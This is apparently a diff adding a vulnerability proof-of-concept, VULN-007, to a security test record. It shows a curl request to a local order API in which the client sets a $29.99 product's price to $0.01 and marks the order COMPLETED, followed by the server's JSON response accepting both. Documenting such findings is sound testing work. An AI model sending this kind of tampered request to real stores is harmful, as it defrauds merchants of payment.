@@ -1,0 +1,19 @@
+== VULN-007 Business Logic: price + status manipulation ==
+# client sets unit price to $0.01 for a $29.99 product
+curl -s -X POST http://127.0.0.1:8001/api/orders -H 'Authorization: Bearer <user1_token>' \
+  -d '{"items":[{"product_id":1,"quantity":1,"price":0.01}],"status":"COMPLETED"}'
+{
+    "id": 5,
+    "user_id": 1,
+    "status": "COMPLETED",
+    "total_amount": 0.01,
+    "created_at": "2026-09-15T18:04:20.936236+05:30",
+    "items": [
+        {
+            "id": 5,
+            "product_id": 1,
+            "quantity": 1,
+            "price": 0.01
+        }
+    ]
+}
